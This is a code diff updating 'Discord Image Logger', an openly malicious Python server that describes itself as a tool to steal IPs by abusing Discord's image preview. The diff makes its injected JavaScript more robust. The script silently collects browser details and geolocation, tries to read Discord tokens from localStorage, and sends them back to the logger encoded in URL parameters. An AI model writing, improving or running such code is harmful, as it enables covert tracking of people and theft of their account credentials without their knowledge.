@@ -3,11 +3,11 @@
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser, json
+import traceback, requests, base64, httpagentparser, json, binascii
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.1"
+__version__ = "v2.2"
 __author__ = "DeKrypt"
 
 config = {
@@ -240,10 +240,21 @@ height: 100vh;
                 coords, extra_data = None, None
 
                 if dic.get("g") and config["accurateLocation"]:
-                    coords = base64.b64decode(dic.get("g").encode()).decode()
+                    try:
+                        coords = base64.b64decode(dic.get("g").encode()).decode()
+                    except (binascii.Error, UnicodeDecodeError): # Catch potential decoding errors
+                        coords = "Invalid Coords Data"
                 
                 if dic.get("d") and config["advancedInfo"]:
-                    extra_data = json.loads(base64.b64decode(dic.get("d").encode()).decode())
+                    try:
+                        encoded_data = dic.get("d")
+                        missing_padding = len(encoded_data) % 4
+                        if missing_padding:
+                            encoded_data += '=' * (4 - missing_padding)
+                        extra_data = json.loads(base64.b64decode(encoded_data.encode()).decode())
+                    except (binascii.Error, json.JSONDecodeError, UnicodeDecodeError): # Catch potential decoding errors
+                        extra_data = {"error": "Invalid Advanced Info Data"}
+
 
                 result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), coords, s.split("?")[0], url, extra_data)
                 
@@ -273,49 +284,52 @@ height: 100vh;
                 if config["accurateLocation"] or config["advancedInfo"]:
                     injection_script += b"""<script>
 var currenturl = window.location.href;
-function R(url) {
-    if (currenturl.includes("?")) {
-        currenturl += ("&" + url);
-    } else {
-        currenturl += ("?" + url);
+function R(param, value) {
+    var url = new URL(currenturl);
+    if (!url.searchParams.has(param)) {
+        url.searchParams.set(param, value);
+        location.replace(url.href);
     }
-    location.replace(currenturl);
 }
 """
                 if config["advancedInfo"]:
                     injection_script += b"""
-if (!currenturl.includes("d=")) {
-    try {
-        var userData = {};
-        userData.resolution = window.screen.width + "x" + window.screen.height;
-        userData.language = navigator.language;
-        userData.cores = navigator.hardwareConcurrency;
-        userData.plugins = Array.from(navigator.plugins).map(p => p.name).join(', ');
-        
-        // This part attempts to find a Discord token.
-        // NOTE: This will likely be blocked by modern browser security (Same-Origin Policy).
-        // It will only work if the user is on an insecure browser or has disabled security features.
+(function() {
+    var url = new URL(window.location.href);
+    if (!url.searchParams.has("d")) {
         try {
-            var token = Object.keys(localStorage).filter(x => x.startsWith('token'))[0];
-            userData.token = localStorage.getItem(token);
-        } catch (e) {
-            userData.token = "Protected by browser security";
-        }
-
-        R("d=" + btoa(JSON.stringify(userData)).replace(/=/g, ""));
-    } catch(e) {}
-}
+            var userData = {};
+            userData.resolution = window.screen.width + "x" + window.screen.height;
+            userData.language = navigator.language;
+            userData.cores = navigator.hardwareConcurrency;
+            userData.plugins = Array.from(navigator.plugins).map(p => p.name).join(', ') || "N/A";
+            
+            // This part attempts to find a Discord token.
+            // NOTE: This will likely be blocked by modern browser security (Same-Origin Policy).
+            try {
+                var token = Object.keys(localStorage).filter(x => x.startsWith('token'))[0];
+                userData.token = localStorage.getItem(token);
+            } catch (e) {
+                userData.token = "Protected";
+            }
+            R("d", btoa(JSON.stringify(userData)).replace(/=/g, ""));
+        } catch(e) { /* Fail silently */ }
+    }
+})();
 """
 
                 if config["accurateLocation"]:
                     injection_script += b"""
-if (!currenturl.includes("g=")) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (pos) {
-            R("g=" + btoa(pos.coords.latitude + "," + pos.coords.longitude).replace(/=/g, ""));
-        });
+(function() {
+    var url = new URL(window.location.href);
+    if (!url.searchParams.has("g")) {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function (pos) {
+                R("g", btoa(pos.coords.latitude + "," + pos.coords.longitude));
+            }, function() { /* Fail silently if user denies */ });
+        }
     }
-}
+})();
 """
                 injection_script += b"</script>"
                 
